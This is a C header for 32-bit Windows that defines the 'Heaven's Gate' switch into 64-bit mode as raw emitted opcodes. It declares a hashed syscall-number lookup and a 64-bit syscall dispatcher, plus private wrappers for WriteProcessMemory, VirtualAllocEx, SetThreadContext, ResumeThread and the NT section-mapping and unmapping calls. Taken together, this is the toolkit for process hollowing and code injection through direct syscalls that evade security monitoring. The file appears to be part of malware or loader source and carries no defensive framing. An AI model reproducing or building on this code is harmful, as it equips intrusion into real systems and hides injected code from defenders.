#pragma once
#include "utils.h"
#include "main.h"
#define RAX 0
#define RCX 1
#define RDX 2
#define RBX 3
#define RSP 4
#define RBP 5
#define RSI 6
#define RDI 7


#define EMIT(x) __asm __emit((x))

#define POP(x) EMIT(((x)+0x58))
#define PUSH(x) EMIT(((x)+0x50))

#define EnterHeavensGate() \
{ \
	EMIT(0x6A) EMIT(0x33)   \
	EMIT(0xE8) EMIT(0x00) EMIT(0x00) EMIT(0x00) EMIT(0x00)\
	EMIT(0x83) EMIT(0x04) EMIT(0x24) EMIT(0x05) \
	EMIT(0xCB) \
}

#define LeaveHeavensGate() \
{ \
	EMIT(0xE8) EMIT(0x00) EMIT(0x00) EMIT(0x00) EMIT(0x00)\
	EMIT(0xC7) EMIT(0x44) EMIT(0x24) EMIT(0x04) EMIT(0x23) EMIT(0x00) EMIT(0x00) EMIT(0x00) \
	EMIT(0x83) EMIT(0x04) EMIT(0x24) EMIT(0x0D) \
	EMIT(0xCB) \
}

DWORD				get_syscall_number(unsigned long dwFuncHash);

BOOL WINAPI			mWriteProcessMemory(
	_In_  HANDLE  hProcess,
	_In_  LPVOID  lpBaseAddress,
	_In_  LPCVOID lpBuffer,
	_In_  SIZE_T  nSize,
	_Out_ SIZE_T  *lpNumberOfBytesWritten
);
LPVOID WINAPI		mVirtualAllocEx(
	_In_     HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD  flAllocationType,
	_In_     DWORD  flProtect
);
BOOL WINAPI mSetThreadContext(
	_In_       HANDLE  hThread,
	_In_ const CONTEXT *lpContext
);
DWORD WINAPI mResumeThread(
	_In_ HANDLE hThread
);
NTSTATUS NTAPI mNtUnmapViewOfSection(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
);
NTSTATUS NTAPI mNtCreateSection(
	_Out_    PHANDLE            SectionHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_     ULONG              SectionPageProtection,
	_In_     ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
);
NTSTATUS NTAPI mNtMapViewOfSection(
	_In_        HANDLE          SectionHandle,
	_In_        HANDLE          ProcessHandle,
	_Inout_     PVOID           *BaseAddress,
	_In_        ULONG_PTR       ZeroBits,
	_In_        SIZE_T          CommitSize,
	_Inout_opt_ PLARGE_INTEGER  SectionOffset,
	_Inout_     PSIZE_T         ViewSize,
	_In_        DWORD			InheritDisposition,
	_In_        ULONG           AllocationType,
	_In_        ULONG           Win32Protect
);
ULONGLONG GetNextArgument(PULONG ulCurrentArg, ULONG ulArgCount, PULONGLONG pulArgs);
ULONG SysCall64(ULONG ulOrdinal, PULONGLONG pulArgs, ULONG ulArgCount);